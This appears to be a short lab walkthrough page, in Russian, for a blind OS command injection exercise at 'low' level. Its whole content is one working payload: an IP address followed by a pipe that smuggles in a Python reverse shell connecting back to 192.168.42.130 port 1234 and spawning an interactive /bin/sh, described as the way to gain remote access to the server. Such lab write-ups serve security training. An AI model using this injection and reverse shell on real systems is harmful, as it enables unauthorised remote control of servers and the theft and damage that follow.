---
title: OS Command Injection - Blind
sidebar_position: 1
---

# OS Command Injection - Blind

**(low)**


Используем команду
```bash
192.168.42.132 | python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("192.168.42.130",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Для получения удаленного доступа к серверу

![](images/OS_Command_Injection_-_Blind_img_1.png)